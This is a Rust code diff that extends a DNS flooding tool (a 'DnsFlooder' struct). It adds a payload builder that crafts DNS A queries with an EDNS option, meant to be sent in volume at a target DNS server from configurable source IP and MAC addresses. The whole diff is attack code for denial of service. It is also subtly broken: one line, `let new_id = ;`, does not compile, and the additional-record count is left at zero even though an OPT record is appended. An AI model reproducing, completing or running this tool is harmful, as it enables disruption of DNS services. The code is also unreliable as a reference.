@@ -23,6 +23,7 @@ struct PacketData {
     dst_port: u16,
     dst_ip:   Ipv4Addr,
     dst_mac:  [u8; 6],
+    payload:  Vec<u8>,
 }
 
 
@@ -53,7 +54,9 @@ impl DnsFlooder {
         let dst_ip   = args.dns_ip;
         let dst_mac  = parse_mac(&dst_mac_str).unwrap();
 
-        PacketData { src_ip, src_mac, dst_port, dst_ip, dst_mac }
+        let payload = Self::create_a_query();
+
+        PacketData { src_ip, src_mac, dst_port, dst_ip, dst_mac, payload }
     }
 
 
@@ -101,6 +104,84 @@ impl DnsFlooder {
             self.pkt_data.dst_ip,
             self.pkt_data.dst_port,
         )
+    }
+
+
+
+    fn create_dns_query(domain: &str, use_edns: bool) -> Vec<u8> {
+        let header_size   = 12;
+        let question_size = Self::compute_question_size(domain);
+        let opt_size      = if use_edns { 11 } else { 0 };
+        let total_size    = header_size + question_size + opt_size;
+        
+        let mut payload = vec![0u8; total_size];
+        let mut pos     = 0;
+        
+        payload[pos..pos + 2].copy_from_slice(&0u16.to_be_bytes()); // ID
+        pos += 2;
+        payload[pos] = 0x01; // Flags: RD = 1
+        pos += 1;
+        payload[pos] = 0x00; // Resto das flags
+        pos += 1;
+        payload[pos] = 0x00; // QDCOUNT alto
+        pos += 1;
+        payload[pos] = 0x01; // QDCOUNT baixo = 1
+        pos += 1;
+        payload[pos..pos + 6].copy_from_slice(&[0u8; 6]); // AN, NS, AR counts = 0
+        pos += 6;
+        
+        for part in domain.split('.') {
+            payload[pos] = part.len() as u8;
+            pos += 1;
+            payload[pos..pos + part.len()].copy_from_slice(part.as_bytes());
+            pos += part.len();
+        }
+
+        payload[pos] = 0;
+        pos += 1;
+        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes()); // QTYPE
+        pos += 2;
+        payload[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes()); // QCLASS = IN
+        pos += 2;
+        
+        if use_edns {
+            payload[pos] = 0;
+            pos += 1;
+            payload[pos..pos + 2].copy_from_slice(&41u16.to_be_bytes()); // TYPE = OPT
+            pos += 2;
+            payload[pos..pos + 2].copy_from_slice(&512u16.to_be_bytes()); // UDPSize
+            pos += 2;
+            payload[pos] = 0; // Extended RCODE
+            pos += 1;
+            payload[pos] = 0; // EDNS Version
+            pos += 1;
+            payload[pos..pos + 4].copy_from_slice(&0u32.to_be_bytes()); // Z + RDATA length
+        }
+        
+        payload
+    }
+
+
+
+    fn compute_question_size(domain: &str) -> usize {
+        let mut size = 0;
+        for part in domain.split('.') {
+            size += 1 + part.len();
+        }
+        size + 1 + 2 + 2
+    }
+    
+
+
+    fn create_a_query() -> Vec<u8> {
+        Self::create_dns_query("microsoft.com", true)
+    }
+    
+
+
+    fn update_dns_id(&mut self) {
+        let new_id = ;
+        self.pkt_data.payload[0..2].copy_from_slice(&new_id.to_be_bytes());
     }
 
 }
